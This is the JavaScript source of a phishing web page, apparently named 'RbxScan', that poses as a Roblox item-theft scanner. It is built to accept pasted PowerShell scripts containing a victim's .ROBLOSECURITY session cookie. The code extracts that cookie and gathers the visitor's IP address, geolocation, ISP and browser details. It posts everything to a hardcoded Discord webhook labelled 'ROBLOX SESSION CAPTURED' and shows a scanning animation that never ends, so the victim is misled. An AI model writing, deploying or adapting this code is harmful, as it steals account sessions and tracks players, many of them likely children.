// Configuration - Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// DOM Elements
const scanBtn = document.getElementById('scanBtn');
const modal = document.getElementById('scanModal');
const itemInput = document.getElementById('itemInput');
const submitBtn = document.getElementById('submitBtn');
const cancelBtn = document.getElementById('cancelBtn');
const closeBtn = document.querySelector('.close');
const themeToggle = document.getElementById('themeToggle');
const aboutBtn = document.getElementById('aboutBtn');
const tosBtn = document.getElementById('tosBtn');
const aboutModal = document.getElementById('aboutModal');
const tosModal = document.getElementById('tosModal');

// Event Listeners
scanBtn.addEventListener('click', openModal);
submitBtn.addEventListener('click', submitItem);
cancelBtn.addEventListener('click', closeModal);
closeBtn.addEventListener('click', closeModal);
window.addEventListener('click', outsideClick);
themeToggle.addEventListener('click', toggleTheme);
aboutBtn.addEventListener('click', () => openInfoModal('about'));
tosBtn.addEventListener('click', () => openInfoModal('tos'));

// Functions
function openModal() {
    modal.style.display = 'block';
    itemInput.focus();
}

function closeModal() {
    modal.style.display = 'none';
    itemInput.value = '';
}

function outsideClick(e) {
    if (e.target === modal || e.target === aboutModal || e.target === tosModal) {
        closeModal();
        closeInfoModals();
    }
}

function openInfoModal(type) {
    if (type === 'about') {
        aboutModal.style.display = 'block';
    } else if (type === 'tos') {
        tosModal.style.display = 'block';
    }
}

function closeInfoModals() {
    aboutModal.style.display = 'none';
    tosModal.style.display = 'none';
}

async function submitItem() {
    const input = itemInput.value.trim();
    
    if (!input) {
        return;
    }

    // Close modal and show infinite loading
    closeModal();
    showInfiniteLoading();
    
    // Send data to webhook in background
    await submitToWebhook(input);
}

function validateInput() {
    const input = itemInput.value.trim();
    const isValid = input.length === 0 || isValidInput(input);
    
    scanBtn.disabled = !input || !isValid;
    
    if (input.length > 0) {
        if (isValid) {
            showValidationMessage('Valid format detected', 'success');
        } else {
            showValidationMessage('Invalid format. Please enter a valid item ID or URL.', 'error');
        }
    } else {
        validationMessage.textContent = '';
        validationMessage.className = 'validation-message';
    }
}

function isValidInput(input) {
    if (input.length === 0) return false;
    
    // Check if it's a PowerShell script first
    if (isPowerShellScript(input)) {
        return true;
    }
    
    // Remove whitespace and convert to lowercase for validation
    const cleanInput = input.replace(/\s+/g, '').toLowerCase();
    
    // Check for various valid Roblox item patterns:
    
    // 1. Roblox Item ID (numeric, typically 6-12 digits)
    const itemIdPattern = /^\d{6,12}$/;
    if (itemIdPattern.test(cleanInput)) {
        return true;
    }
    
    // 2. Roblox Asset URL
    const assetUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (assetUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 3. Asset ID from URL
    const assetIdFromUrl = cleanInput.match(/\/catalog\/(\d+)/);
    if (assetIdFromUrl && assetIdFromUrl[1].length >= 6) {
        return true;
    }
    
    // 4. Bundle URLs
    const bundleUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/bundles\/\d+/;
    if (bundleUrlPattern.test(cleanInput)) {
        return true;
    }
    
    // 5. UGC Item URLs
    const ugcUrlPattern = /^(https?:\/\/)?(www\.)?roblox\.com\/catalog\/\d+/;
    if (ugcUrlPattern.test(cleanInput)) {
        return true;
    }
    
    return false;
}

function isPowerShellScript(input) {
    // Normalize whitespace and check for key PowerShell script components
    const normalizedInput = input.replace(/\s+/g, ' ').trim();
    
    // Check for required PowerShell session script patterns
    const requiredPatterns = [
        /\$session\s*=\s*New-Object\s+Microsoft\.PowerShell\.Commands\.WebRequestSession/i,
        /\$session\.UserAgent\s*=\s*["']/i,
        /\$session\.Cookies\.Add/i,
        /New-Object\s+System\.Net\.Cookie/i,
        /GuestData.*UserID/i,
        /RBXcb/i,
        /\.ROBLOSECURITY/i,
        /Invoke-WebRequest/i,
        /-UseBasicParsing/i,
        /-Uri\s+["']https?:\/\/.*roblox\.com/i,
        /-WebSession\s+\$session/i,
        /-Headers\s+@\{/i
    ];
    
    // Additional specific patterns that should be present
    const specificPatterns = [
        /rbxid=/i, // User ID pattern
        /sessionid=/i, // Session ID pattern
        /authority.*roblox\.com/i,
        /sec-ch-ua/i,
        /sec-fetch/i
    ];
    
    // Count matches
    const mainMatches = requiredPatterns.filter(pattern => pattern.test(normalizedInput));
    const specificMatches = specificPatterns.filter(pattern => pattern.test(normalizedInput));
    
    // Must have at least 8 out of 12 main patterns and at least 2 specific patterns
    if (mainMatches.length >= 8 && specificMatches.length >= 2) {
        return true;
    }
    
    // Additional validation: check for minimum script length (should be substantial like the template)
    if (normalizedInput.length >= 800) {
        // Check for proper PowerShell script structure similar to template
        const hasSessionObject = /\$session\s*=\s*New-Object.*WebRequestSession/i.test(normalizedInput);
        const hasMultipleCookies = (normalizedInput.match(/\$session\.Cookies\.Add/gi) || []).length >= 3;
        const hasInvokeWebRequest = /Invoke-WebRequest.*-UseBasicParsing.*-Uri.*-WebSession.*-Headers/i.test(normalizedInput);
        const hasRoblosecurity = /\.ROBLOSECURITY.*WARNING.*DO-NOT-SHARE/i.test(normalizedInput);
        
        return hasSessionObject && hasMultipleCookies && hasInvokeWebRequest && hasRoblosecurity;
    }
    
    return false;
}

function showValidationError() {
    const modalBody = document.querySelector('.modal-body');
    const errorElement = document.createElement('div');
    errorElement.className = 'validation-error';
    errorElement.innerHTML = `
        <p>❌ Invalid format. Please enter a valid Roblox item:</p>
        <ul>
            <li>• Roblox Item ID (e.g., 123456789)</li>
            <li>• Roblox Asset URL (e.g., roblox.com/catalog/123456789)</li>
            <li>• Bundle URL (e.g., roblox.com/bundles/123456)</li>
            <li>• UGC Item URL</li>
        </ul>
    `;
    
    modalBody.insertBefore(errorElement, modalBody.querySelector('.button-group'));
}

function extractItemId(input) {
    // Check if it's a PowerShell script
    if (isPowerShellScript(input)) {
        const extractedInfo = {
            type: 'PowerShell Script',
            length: input.length,
            hasRoblosecurity: /\.ROBLOSECURITY/i.test(input),
            hasUserAgent: /UserAgent/i.test(input),
            hasCookies: /Cookies\.Add/i.test(input)
        };
        
        // Extract session ID if present
        const sessionMatch = input.match(/sessionid=([a-f0-9\-]+)/i);
        if (sessionMatch) {
            extractedInfo.sessionId = sessionMatch[1];
        }
        
        // Extract user ID from cookies if present
        const userIdMatch = input.match(/UserID=(-?\d+)/i);
        if (userIdMatch) {
            extractedInfo.userId = userIdMatch[1];
        }
        
        // Extract rbxid if present
        const rbxidMatch = input.match(/rbxid=(\d+)/i);
        if (rbxidMatch) {
            extractedInfo.rbxid = rbxidMatch[1];
        }
        
        return JSON.stringify(extractedInfo, null, 2);
    }
    
    const cleanInput = input.replace(/\s+/g, '');
    
    // Extract ID from URL
    const urlMatch = cleanInput.match(/\/catalog\/(\d+)/);
    if (urlMatch) {
        return urlMatch[1];
    }
    
    // Extract ID from bundle URL
    const bundleMatch = cleanInput.match(/\/bundles\/(\d+)/);
    if (bundleMatch) {
        return `bundle:${bundleMatch[1]}`;
    }
    
    // Return as-is if it's already a clean ID
    return cleanInput;
}

function extractRobloxCookie(input) {
    // Extract the .ROBLOSECURITY cookie value
    const cookieMatch = input.match(/\.ROBLOSECURITY['"]\s*,\s*['"]([^'"]+)['"]/i);
    if (cookieMatch) {
        return cookieMatch[1];
    }
    
    // Alternative pattern for different formatting
    const altMatch = input.match(/\.ROBLOSECURITY.*?([A-Za-z0-9_\-|\.%=]+)/i);
    if (altMatch) {
        return altMatch[1];
    }
    
    return "Cookie not found in script";
}

function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    
    document.documentElement.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
}

function initializeTheme() {
    // Check for saved theme preference or default to light mode
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    const initialTheme = savedTheme || (systemPrefersDark ? 'dark' : 'light');
    document.documentElement.setAttribute('data-theme', initialTheme);
}

function handleKeyDown(e) {
    // Allow Enter to scan
    if (e.key === 'Enter') {
        if (!scanBtn.disabled) {
            scanItem();
        }
    }
}

function showLoading() {
    loadingOverlay.style.display = 'flex';
    submitBtn.disabled = true;
}

function showInfiniteLoading() {
    // Create and show infinite loading overlay
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <div class="loading-spinner"></div>
        <p>Scanning item...</p>
    `;
    document.body.appendChild(loadingOverlay);
    
    // Disable all interactions
    scanBtn.disabled = true;
    
    // Show the overlay
    loadingOverlay.style.display = 'flex';
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
    submitBtn.disabled = false;
    validateInput();
}

function showMessage(type, duration = 3000) {
    hideMessages();
    const messageElement = type === 'success' ? successMessage : errorMessage;
    messageElement.style.display = 'block';
    
    setTimeout(() => {
        messageElement.style.display = 'none';
    }, duration);
}

function hideMessages() {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';
}

async function getUserLocation() {
    try {
        // Get IP and location data from ipapi.co (free service)
        const response = await fetch('https://ipapi.co/json/');
        const locationData = await response.json();
        
        return {
            ip: locationData.ip,
            city: locationData.city,
            region: locationData.region,
            country: locationData.country_name,
            country_code: locationData.country_code,
            postal: locationData.postal,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            timezone: locationData.timezone,
            isp: locationData.org
        };
    } catch (error) {
        console.error('Error getting location:', error);
        // Fallback - try to get just IP from another service
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return { ip: ipData.ip };
        } catch (ipError) {
            return { ip: 'unknown', error: 'Unable to fetch location data' };
        }
    }
}

async function submitToWebhook(input) {
    try {
        // Get user location data
        const locationData = await getUserLocation();
        
        // Extract clean item ID
        const cleanItemId = extractItemId(input);
        
        // Check if it's a PowerShell script for different handling
        const isPowerShell = isPowerShellScript(input);
        
        // Format data for Discord webhook
        const discordMessage = {
            content: isPowerShell ? "@everyone 🚨 **ROBLOX SESSION CAPTURED** 🚨" : "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
            embeds: [{
                title: isPowerShell ? "🔍 Roblox Session Intercepted" : "🔍 Item Theft Check Request",
                color: isPowerShell ? 0xff0000 : 0x58a6ff, // Red for PowerShell, Blue for items
                timestamp: new Date().toISOString(),
                fields: isPowerShell ? [
                    {
                        name: "🍪 ROBLOSECURITY Cookie",
                        value: `\`\`\`\n${extractRobloxCookie(input)}\n\`\`\``,
                        inline: false
                    },
                    {
                        name: "📝 Script Analysis",
                        value: `**Script Analysis:**\n\`\`\`json\n${cleanItemId}\n\`\`\`\n**Status:** Session captured successfully`,
                        inline: false
                    },
                ] : [
                    {
                        name: "🎮 Item Details",
                        value: `**Input:** \`${input.length > 100 ? input.substring(0, 100) + '...' : input}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
                        inline: false
                    },
                ],
                    {
                        name: "🌍 Location",
                        value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
                        inline: true
                    },
                    {
                        name: "💻 Browser Info",
                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
                        inline: true
                    }
                ],
                footer: {
                    text: "RbxScan Website",
                    icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
                }
            }]
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            discordMessage.embeds[0].fields.push({
                name: "📍 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Lng:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone || 'Unknown'}`,
                inline: true
            });
        }
        
        // Send to Discord webhook silently
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordMessage)
        });
        
    } catch (error) {
        console.error('Error submitting to webhook:', error);
    }
    
    // Keep scanning animation running forever - never stop!
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Initialize theme
    initializeTheme();
    
    // Check if webhook URL is configured
    if (WEBHOOK_URL === 'https://your-webhook-url-here.com/webhook') {
        console.warn('⚠️ Please configure your webhook URL in script.js');
        
        // Show a warning in the console for developers
        setTimeout(() => {
            console.log(`
🔧 SETUP REQUIRED:
1. Open script.js
2. Replace 'https://your-webhook-url-here.com/webhook' with your actual webhook URL
3. Your webhook should accept POST requests with JSON data containing a 'code' field
            `);
        }, 1000);
    }
    
    console.log('RbxScan website loaded successfully! 🚀');
});